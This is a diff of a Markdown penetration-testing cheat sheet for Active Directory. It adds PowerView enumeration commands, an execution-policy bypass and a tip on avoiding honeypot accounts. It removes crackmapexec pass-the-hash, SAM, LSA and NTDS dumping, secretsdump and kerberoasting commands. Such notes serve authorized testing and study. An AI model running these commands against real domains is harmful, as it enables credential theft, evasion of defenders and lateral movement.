@@ -3,13 +3,44 @@
 # First we  need to shutdown execution policy using powershell
 powershell -ep (or -ExecutionPolicy ) bypass
 . .\ PowerView.ps1
-Get-NetDomain # prints info about DC
-Get-NetDomainController # points at DC 
-Get-DomainPolicy # shows policies*
-(Get-DomainPolicy)."system access" # More info about policies 
-Get-ComputerInfo #Prints all info about the system 
-Get-DomainComputer COMPUTER_NAME # check for computer on domain
+| select OPTION # it's like grep in linux
+ Domain
+	Get-NetDomain # prints info about Domain
+	Get-NetDomainController # points at DC 
+	Get-DomainPolicy # shows policies
+	(Get-DomainPolicy)."system access" # More info about policies 
 
+ Users
+	Get-netuser # prints all users inside the domain 
+	Get-netuser | select cn # prints only users names
+	Get-netuser | select samaccountname  # prints only users names
+	Get-netuser | select description # prints all users description
+	Get-UserProperty # show all users properties
+	Get-UserProperty -Properties <OPTION> # filter properties by  
+	Get-UserProperty -Properties pwdlastset # filter properties for pwdlastset - Prints all users last password set
+	Get-UserProperty -Properties logoncount # prints users logon count (Avoid accounts that has 0 logon maybe honeypot)
+	Get-UserProperty -Properties badpwd # prints bad password count 
+
+Computers
+	Get-NetComputer # Shows computers in the domain 
+	Get-NetComputer -FullData # more info about computers
+	Get-NetComputer -FullData | select OperatingSystem # prints only operating system info for computers in the domain 
+	Get-ComputerInfo #Prints all info about the system 
+	Get-DomainComputer COMPUTER_NAME # check for computer on domain
+
+Groups
+	Get-NetGroup # print groups 
+	Get-NetGroup -GroupName "Domain Admins" # search for domain group names
+	Get-NetGroup -GroupName *admin* # wildcard search 
+	Get-NetGroupMember -GroupName "Domain Admins" # same options but prints memebers of the group
+
+Shares
+	Invoke-ShareFinder # prints all shares
+
+
+GroupPolicies
+	Get-NetGPO # prints group policies
+	Get-NetGPO | select displayname, whenchanged # prints displayname and whenchanged from Get-NetGPO
 ```
 
 
@@ -66,35 +97,7 @@ Start adPEAS with all enumeration modules, enumerate the domain 'contoso.com' an
 Invoke-adPEAS -Domain contoso.com -Username 'contoso\johndoe' -Password 'Passw0rd1!'
 ```
 
-# crackmapexec 
-#passhash 
-```bash
 
-crackmapexec smb <IP/CIDR or range> -u <user> -H <hash> --local-auth 
-
-#passpassword
-crackmapexec smb <IP/CIDR or range> -u <user> -d <domain> -p <pass> 
-
-# flags
--u # USER
--p # PASSWORD
--H # Hash
--x # Execute a command 
---local-auth # login
-
-
-# gather creds
---sam to dump sam hahses
---lsa dump lsa secrets
---ntds dump NTDS.dit
-```
-
-
-# secretsdump
-dumping hashes and secrets in windows
-```
-secretsdump.py DOMAIN/USER:PASSWORD@IP
-```
 
 # In msfconsole 
 
@@ -106,12 +109,6 @@ secretsdump.py DOMAIN/USER:PASSWORD@IP
 smb_enum_gpp moudle 
 ```
 
-# GetUserSPNs.py
-For kerberoasting (Capture TGT account's hash)
-hashcat -m 13100
-```
-GetUserSPNs.py <DOMAIN/username:password> -dc-ip <ip of DC> -request
-```
 
 # gpp-decrypt
 gpp-decrypt <HASH>
